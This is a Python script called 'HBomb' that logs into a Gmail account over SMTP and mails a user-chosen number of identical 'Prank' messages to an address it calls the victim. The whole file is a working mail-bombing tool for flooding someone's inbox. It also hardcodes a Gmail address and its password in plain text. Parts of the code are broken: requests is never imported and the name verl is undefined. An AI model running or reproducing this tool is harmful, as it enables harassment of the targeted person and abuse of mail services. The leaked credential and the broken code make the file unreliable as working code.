import smtplib
import sys
import os
Red = '\033[1;31m'
Blue= '\033[1;36m'
Endc = '\033[0m'


def checkinternet():
    res = False
    try:
        requests.get('https://www.google.com', verify=True)
        res = False
    except Exception:
        res = True
    if res:
        print("\n\n\tYour Internet Speed is Slow or You Are Using Proxies...")
        print('\t\tHBomb Will Stop Now...\n\n')
        banner()
        exit()

def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def banner():
    
    clr()
    logo="""
 ██░ ██  ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   
▓██░ ██▒▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ 
▒██▀▀██░▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██
░▓█ ░██ ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  
░▓█▒░██▓░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓
 ▒ ░░▒░▒░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒
 ▒ ░▒░ ░▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░ 
 ░  ░░ ░ ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░ 
 ░  ░  ░ ░          ░ ░         ░    ░      
              ░                           ░
               ""","""
----------------   --------------------
| KLS  Project |   | Version : """,verl,""" |
----------------   --------------------
\tCreated by Honey Pots...
-------------------------------------------- 
"""
    print(Red+logo[0]+Blue+logo[1]+logo[2]+logo[3])


def mail():
    print(Red+ "\tMail Bombing \n" +Blue)
    SG = "honeypots24@gmail.com"
    pws = "sudhanhu24#@"
    RG0 = str(input("Enter Victim Mail address : "))
    RG = RG0.strip()
    while "@gmail.com" != RG[-10:] :
        RG = input("\aInvalid Mail Please Enter Again  : ")
    while int(len(RG)) < 10 : 
        RG = input("\aInvalid Mail Please Enter Again  : ")

    num = input("Enter Number of Mail : ")
    while num == '':
        num = input("Please Enter Number of Mail : ")

    while num.isdigit() != True:
        num = input("\aInvalid! Please Enter Number of Mail : ")

    mail = int(num) + 1
    connection = smtplib.SMTP('smtp.gmail.com', 587)
    connection.ehlo()
    connection.starttls()
    connection.login(SG , pws)
    for a in range(1, int(mail)) :
        connection.sendmail(SG, RG, "Subject:Prank \n\n Dear Best Bro")
        clr()
        banner()
        print(Blue)
        print("-------------------------------------------- ")
        print(Red +"                  Details "+Blue)
        print(" Target Mail             : ",RG)
        print(" Number of Requests Sent : ",num)
        print(" Successful Requests     : ",a)
        print(" Failed Requests         : ",0)
        print("-------------------------------------------- ")
        print("            Bombing In Progress")        
banner()

mail()
